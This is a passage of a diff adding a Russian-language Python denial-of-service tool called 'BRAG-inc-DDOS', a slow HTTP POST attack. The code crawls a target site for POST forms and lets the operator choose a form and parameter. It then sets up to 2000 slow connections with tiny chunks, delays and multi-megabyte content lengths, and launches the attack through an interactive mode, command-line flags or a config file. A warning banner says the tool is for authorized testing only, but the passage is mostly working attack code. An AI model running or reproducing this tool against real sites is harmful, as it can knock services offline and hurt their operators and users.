+        max_pages = max(1, min(max_pages, 50))
+    except:
+        max_pages = 15
+    
+    try:
+        max_depth_input = input("Максимальная глубина сканирования (по умолчанию 2): ").strip()
+        max_depth = int(max_depth_input) if max_depth_input else 2
+        max_depth = max(1, min(max_depth, 5))
+    except:
+        max_depth = 2
+    
+    # Сканирование сайта
+    print(f"\n🔍 Сканирование {url} (макс. страниц: {max_pages}, глубина: {max_depth})...")
+    
+    try:
+        scanner = AdvancedTargetScanner(url)
+        forms = scanner.scan_site(max_pages=max_pages, max_depth=max_depth, use_sitemap=True)
+        
+        if not forms:
+            print("❌ POST-формы не найдены!")
+            
+            # Предлагаем ручной ввод
+            use_manual = input("\nХотите указать форму вручную? (y/n): ").lower().strip()
+            if use_manual == 'y':
+                form_action = input("Введите URL действия формы: ").strip()
+                if not form_action:
+                    form_action = url
+                
+                param_input = input("Введите имя POST-параметра: ").strip()
+                if not param_input:
+                    print("❌ Имя параметра обязательно!")
+                    return
+                
+                forms = [{
+                    'action': form_action,
+                    'method': 'POST',
+                    'inputs': [param_input],
+                    'input_details': [{'name': param_input, 'type': 'text', 'required': False}],
+                    'source_url': url,
+                    'scan_timestamp': datetime.now().isoformat()
+                }]
+                print(f"✅ Ручная форма добавлена: {form_action} с параметром {param_input}")
+            else:
+                return
+        else:
+            print(f"✅ Найдено {len(forms)} POST-форм")
+    
+    except Exception as e:
+        print(f"❌ Ошибка сканирования: {e}")
+        return
+    
+    # Сохранение результатов сканирования
+    save_scan_results(forms)
+    
+    # Выбор формы
+    print(f"\n📋 Выберите форму для атаки:\n")
+    
+    for i, form in enumerate(forms, 1):
+        print(f"{i}. {form['action']}")
+        print(f"   Метод: {form['method']}")
+        print(f"   Параметры: {', '.join(form['inputs'][:3])}")
+        if len(form['inputs']) > 3:
+            print(f"   ... и еще {len(form['inputs']) - 3} параметров")
+        if form.get('source_url'):
+            print(f"   Источник: {form['source_url']}")
+        print()
+    
+    try:
+        form_index = int(input(f"Выберите форму (1-{len(forms)}): ")) - 1
+        if form_index < 0 or form_index >= len(forms):
+            form_index = 0
+            print(f"Используется форма по умолчанию: 1")
+    except:
+        form_index = 0
+        print(f"Используется форма по умолчанию: 1")
+    
+    selected_form = forms[form_index]
+    
+    # Выбор параметра
+    selected_param = None
+    
+    if len(selected_form['inputs']) > 1:
+        print(f"\n🎯 Выберите параметр для атаки:")
+        
+        for i, param in enumerate(selected_form['inputs'], 1):
+            param_detail = next((detail for detail in selected_form['input_details'] 
+                               if detail['name'] == param), {})
+            required_mark = " [обязательный]" if param_detail.get('required') else ""
+            print(f"{i}. {param}{required_mark}")
+        
+        try:
+            param_index = int(input(f"Выберите параметр (1-{len(selected_form['inputs'])}): ")) - 1
+            if param_index < 0 or param_index >= len(selected_form['inputs']):
+                param_index = 0
+        except:
+            param_index = 0
+    else:
+        param_index = 0
+    
+    selected_param = selected_form['inputs'][param_index]
+    
+    # Настройка атаки
+    print("\n⚙️  Настройка параметров атаки:")
+    
+    # Количество соединений
+    try:
+        num_conn_input = input(f"Количество соединений (1-2000, по умолчанию 150): ").strip()
+        num_conn = int(num_conn_input) if num_conn_input else 150
+        num_conn = max(1, min(num_conn, 2000))
+    except:
+        num_conn = 150
+    
+    # Размер чанков
+    try:
+        chunk_min_input = input(f"Минимальный размер чанка (1-500, по умолчанию 1): ").strip()
+        chunk_min = int(chunk_min_input) if chunk_min_input else 1
+        chunk_min = max(1, min(chunk_min, 500))
+    except:
+        chunk_min = 1
+    
+    try:
+        chunk_max_input = input(f"Максимальный размер чанка (1-500, по умолчанию 10): ").strip()
+        chunk_max = int(chunk_max_input) if chunk_max_input else 10
+        chunk_max = max(chunk_min, min(chunk_max, 500))
+    except:
+        chunk_max = 10
+    
+    # Задержки
+    try:
+        delay_min_input = input(f"Минимальная задержка (0.1-30, по умолчанию 0.5): ").strip()
+        delay_min = float(delay_min_input) if delay_min_input else 0.5
+        delay_min = max(0.1, min(delay_min, 30))
+    except:
+        delay_min = 0.5
+    
+    try:
+        delay_max_input = input(f"Максимальная задержка (0.1-60, по умолчанию 5.0): ").strip()
+        delay_max = float(delay_max_input) if delay_max_input else 5.0
+        delay_max = max(delay_min, min(delay_max, 60))
+    except:
+        delay_max = 5.0
+    
+    # Дополнительные параметры
+    print("\n📊 Дополнительные настройки:")
+    
+    try:
+        content_length_input = input(f"Длина контента в байтах (1000000-100000000, по умолчанию случайно): ").strip()
+        if content_length_input:
+            content_length = int(content_length_input)
+            content_length = max(1000000, min(content_length, 100000000))
+            randomize_content = False
+        else:
+            content_length = random.randint(5000000, 20000000)
+            randomize_content = True
+    except:
+        content_length = random.randint(5000000, 20000000)
+        randomize_content = True
+    
+    # Подтверждение
+    print(f"\n📋 Конфигурация атаки:")
+    print(f"   Целевой URL: {selected_form['action']}")
+    print(f"   Параметр: {selected_param}")
+    print(f"   Соединений: {num_conn}")
+    print(f"   Размер чанка: {chunk_min}-{chunk_max} байт")
+    print(f"   Задержка: {delay_min}-{delay_max} секунд")
+    print(f"   Длина контента: {format_bytes(content_length)}")
+    print(f"   Случайная длина: {'Да' if randomize_content else 'Нет'}")
+    
+    estimated_traffic = num_conn * content_length / 1024 / 1024
+    print(f"\n⚠️  ПРЕДУПРЕЖДЕНИЕ: Будет отправлено {num_conn} медленных POST-запросов!")
+    print(f"   Ожидаемый трафик: ~{estimated_traffic:.1f} MB")
+    print(f"   Ожидаемое время: ~{(num_conn * delay_max / 60):.1f} минут")
+    
+    confirm = input("\nВведите 'CONFIRM' для запуска атаки: ")
+    if confirm.upper() != 'CONFIRM':
+        print("Атака отменена.")
+        return
+    
+    # Запуск атаки
+    manager = IntelligentConnectionManager()
+    attack_config = {
+        'chunk_min': chunk_min,
+        'chunk_max': chunk_max,
+        'delay_min': delay_min,
+        'delay_max': delay_max,
+        'content_length': content_length,
+        'randomize_content_length': randomize_content,
+        'max_connections_per_second': min(20, num_conn // 10 + 1)
+    }
+    
+    try:
+        print("\n" + "="*70)
+        print("🚀 ЗАПУСК АТАКИ...")
+        print("="*70)
+        
+        manager.start_attack(
+            url,
+            selected_form['action'],
+            selected_param,
+            num_conn,
+            attack_config
+        )
+        
+    except KeyboardInterrupt:
+        print("\n\n⚠️  Атака прервана пользователем")
+    except Exception as e:
+        print(f"\n❌ Ошибка: {e}")
+
+# ============================================================================
+# ГЛАВНАЯ ФУНКЦИЯ
+# ============================================================================
+
+def main() -> None:
+    """Главная функция с расширенной обработкой аргументов"""
+    # Отображение баннера
+    display_banner()
+    
+    # Пауза для прочтения предупреждения
+    time.sleep(1)
+    
+    # Парсинг аргументов командной строки
+    parser = argparse.ArgumentParser(
+        description=f'BRAG-inc-DDOS v{VERSION} - Enhanced Slow HTTP POST Test Tool',
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog=f'''
+Примеры использования:
+  %(prog)s --url https://example.com --param login --connections 100
+  %(prog)s --config myconfig.conf
+  %(prog)s --scan-only https://example.com
+  %(prog)s --url https://example.com --param user --chunk-min 1 --chunk-max 5 --delay-min 1 --delay-max 3
+
+Версия: {VERSION}
+Автор: {AUTHOR}
+Лицензия: {LICENSE}
+'''
+    )
+    
+    # Основные параметры
+    parser.add_argument('-u', '--url', help='Целевой URL')
+    parser.add_argument('-c', '--config', help='Файл конфигурации', default='rudeadyet.conf')
+    parser.add_argument('-p', '--param', help='Имя POST-параметра')
+    parser.add_argument('-a', '--action', help='URL действия формы (если отличается от целевого)')
+    parser.add_argument('-n', '--connections', type=int, default=150, help='Количество соединений (1-2000)')
+    
+    # Параметры сканирования
+    parser.add_argument('-s', '--scan-only', action='store_true', help='Только сканирование, без атаки')
+    parser.add_argument('-o', '--output', help='Файл для сохранения результатов сканирования')
+    parser.add_argument('--max-pages', type=int, default=20, help='Максимальное количество страниц для сканирования')
+    parser.add_argument('--max-depth', type=int, default=3, help='Максимальная глубина сканирования')
+    
+    # Параметры атаки
+    parser.add_argument('--chunk-min', type=int, default=1, help='Минимальный размер чанка')
+    parser.add_argument('--chunk-max', type=int, default=10, help='Максимальный размер чанка')
+    parser.add_argument('--delay-min', type=float, default=0.5, help='Минимальная задержка между чанками')
+    parser.add_argument('--delay-max', type=float, default=5.0, help='Максимальная задержка между чанками')
+    parser.add_argument('--content-length', type=int, help='Длина контента в байтах')
+    
+    # Дополнительные параметры
+    parser.add_argument('-v', '--verbose', action='store_true', help='Подробный вывод')
+    parser.add_argument('--no-banner', action='store_true', help='Не показывать баннер')
+    parser.add_argument('--version', action='version', version=f'%(prog)s {VERSION}')
+    
+    args = parser.parse_args()
+    
+    # Настройка уровня логирования
+    if args.verbose:
+        logger.setLevel(logging.DEBUG)
+        logger.debug("Включен подробный режим")
+    
+    # Показ баннера если не отключен
+    if not args.no_banner and not args.scan_only:
+        print("\n" + "="*70)
+        print("⚠️  ВНИМАНИЕ: Этот инструмент предназначен ТОЛЬКО для АВТОРИЗОВАННОГО тестирования безопасности!")
+        print("   Использование против систем без разрешения является НЕЗАКОННЫМ.")
+        print("   Вы несете полную ответственность за свои действия.")
+        print("="*70 + "\n")
+    
+    # Режим только сканирования
+    if args.scan_only and args.url:
+        print(f"🔍 Сканирование {args.url}...")
+        
+        try:
+            scanner = AdvancedTargetScanner(args.url)
+            forms = scanner.scan_site(max_pages=args.max_pages, max_depth=args.max_depth)
+            
+            if forms:
+                print(f"\n✅ Найдено {len(forms)} POST-форм:")
+                
+                for i, form in enumerate(forms, 1):
+                    print(f"\n  {i}. {form['action']}")
+                    print(f"     Метод: {form['method']}")
+                    print(f"     Параметры: {', '.join(form['inputs'][:5])}")
+                    if len(form['inputs']) > 5:
+                        print(f"     ... и еще {len(form['inputs']) - 5} параметров")
+                    if form.get('source_url'):
+                        print(f"     Источник: {form['source_url']}")
+                
+                if args.output:
+                    save_scan_results(forms, args.output)
+                    print(f"\n📁 Результаты сохранены в {args.output}")
+                else:
+                    save_scan_results(forms)
+                    print(f"\n📁 Результаты сохранены в scan_results.json")
+            else:
+                print("❌ POST-формы не найдены.")
+            
+            return
+        
+        except Exception as e:
+            print(f"❌ Ошибка сканирования: {e}")
+            return
+    
+    # Режим с URL и параметром
+    if args.url:
+        if not args.param:
+            print("❌ Ошибка: POST-параметр обязателен при указании --url")
+            print("   Используйте --scan-only для поиска параметров")
+            return
+        
+        form_action = args.action or args.url
+        
+        print(f"\n📋 Конфигурация атаки:")
+        print(f"   Цель: {args.url}")
+        print(f"   Действие формы: {form_action}")
+        print(f"   Параметр: {args.param}")
+        print(f"   Соединений: {args.connections}")
+        print(f"   Размер чанка: {args.chunk_min}-{args.chunk_max} байт")
+        print(f"   Задержка: {args.delay_min}-{args.delay_max} секунд")
+        
+        if args.content_length:
+            print(f"   Длина контента: {format_bytes(args.content_length)}")
+        
+        estimated_traffic = args.connections * (args.content_length or 10000000) / 1024 / 1024
+        print(f"   Ожидаемый трафик: ~{estimated_traffic:.1f} MB")
+        
+        if not args.verbose:
+            confirm = input("\nВведите 'YES' для подтверждения: ")
+            if confirm.upper() != 'YES':
+                print("Атака отменена.")
+                return
+        
+        # Создание менеджера и запуск атаки
+        manager = IntelligentConnectionManager()
+        attack_config = {
+            'chunk_min': args.chunk_min,
+            'chunk_max': args.chunk_max,
+            'delay_min': args.delay_min,
+            'delay_max': args.delay_max
+        }
+        
+        if args.content_length:
+            attack_config['content_length'] = args.content_length
+            attack_config['randomize_content_length'] = False
+        
+        try:
+            manager.start_attack(
+                args.url,
+                form_action,
+                args.param,
+                args.connections,
+                attack_config
+            )
+        except KeyboardInterrupt:
+            print("\n⚠️  Атака остановлена.")
+    
+    # Режим конфигурационного файла
+    elif os.path.exists(args.config):
+        config = load_config(args.config)
+        
+        if config.get('url') and config.get('attack_parameter'):
+            print(f"✅ Конфигурация загружена:")
+            print(f"   URL: {config['url']}")
+            print(f"   Параметр: {config['attack_parameter']}")
+            print(f"   Соединений: {config['num_connections']}")
+            
+            confirm = input("\nВведите 'YES' для запуска: ")
+            if confirm.upper() != 'YES':
+                print("Атака отменена.")
+                return
+            
+            manager = IntelligentConnectionManager()
+            manager.start_attack(
+                config['url'],
+                config.get('form_action', config['url']),
+                config['attack_parameter'],
+                config['num_connections'],
+                config
+            )
+        else:
+            print("❌ Неверный файл конфигурации. Отсутствуют обязательные параметры.")
+    
+    # Интерактивный режим
+    else:
+        interactive_mode()
+
+# ============================================================================
+# ТОЧКА ВХОДА
+# ============================================================================
+
+if __name__ == '__main__':
+    # Проверка версии Python
+    if sys.version_info < (3, 7):
+        print("❌ Ошибка: Требуется Python 3.7 или выше")
+        sys.exit(1)
+    
+    # Основной блок выполнения
+    try:
+        main()
+    except KeyboardInterrupt:
+        print("\n\n👋 Выход...")
+        sys.exit(0)
+    except Exception as e:
+        logger.error(f"Критическая ошибка: {e}")
+        sys.exit(1)
